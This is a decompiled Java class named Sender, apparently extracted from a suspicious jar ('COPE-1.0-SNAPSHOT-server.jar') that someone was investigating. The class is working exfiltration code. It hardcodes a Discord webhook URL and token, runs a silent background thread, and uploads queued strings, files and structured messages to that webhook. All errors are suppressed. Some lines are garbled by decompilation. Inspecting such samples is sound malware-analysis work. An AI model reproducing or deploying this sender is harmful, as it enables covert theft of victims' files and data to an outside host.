/*    */ package idasido.adldaosd.wpiw.payload;
/*    */ import com.google.gson.JsonArray;
/*    */ import com.google.gson.JsonElement;
/*    */ import com.google.gson.JsonObject;
/*    */ import com.squareup.okhttp.MultipartBuilder;
/*    */ import com.squareup.okhttp.OkHttpClient;
/*    */ import com.squareup.okhttp.Request;
/*    */ import idasido.adldaosd.wpiw.util.Message;
/*    */ import java.io.File;
/*    */ 
/*    */ public final class Sender {
/* 12 */   private static final Sender INSTANCE = new Sender();
/* 13 */   private final Queue<Object> queue = new ArrayDeque();
/*    */ 
/*    */   
/*    */   private Sender() {
/* 17 */     String hooker = "https://ptb.discord.com/api/webhooks/876237083369418763/gPOVK8n4U1ITFcWsWQtX5cKNPXDYCI0Xvs7-VNCGJiA2SBEcABaB2hKDDwHuPpgu2cxR";
/* 18 */     (new Thread(() -> {
/*    */           while (true)
/*    */           { try {
/*    */               Thread.sleep(3500L);
/*    */               
/*    */               if (this.queue.isEmpty()) {
/*    */                 continue;
/*    */               }
/*    */               
/*    */               Object item = this.queue.poll();
/*    */               OkHttpClient client = new OkHttpClient();
/*    */               MultipartBuilder builder = (new MultipartBuilder()).type(MultipartBuilder.FORM);
/*    */               if (item instanceof String) {
/*    */                 builder.addFormDataPart("payload_json", "{\"content\":\"" + item + "\"}");
/*    */               } else if (item instanceof File) {
/*    */                 builder.addFormDataPart("file1", ((File)item).getName(), RequestBody.create(MediaType.parse("application/octet-stream"), (File)item));
/*    */               } else if (item instanceof Message) {
/*    */                 JsonObject obj = new JsonObject();
/*    */                 obj.addProperty("title", ((Message)item).getName());
/*    */                 JsonArray embeds = new JsonArray();
/*    */                 JsonObject embed = new JsonObject();
/*    */                 JsonArray fields = new JsonArray();
/*    */                 ((Message)item).getFields().forEach(());
/*    */                 embed.add("fields", (JsonElement)fields);
/*    */                 embeds.add((JsonElement)embed);
/*    */                 obj.add("embeds", (JsonElement)embeds);
/*    */                 builder.addFormDataPart("payload_json", obj.toString());
/*    */               } else {
/*    */                 continue;
/*    */               } 
/*    */               Request request = (new Request.Builder()).url(hooker).method("POST", builder.build()).build();
/*    */               client.newCall(request).execute().body().close();
/* 50 */             } catch (Exception exception) {} }  })).start();
/*    */   }
/*    */ 
/*    */   
/*    */   public static void send(Object string) {
/* 55 */     INSTANCE.queue.add(string);
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpiw\payload\Sender.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */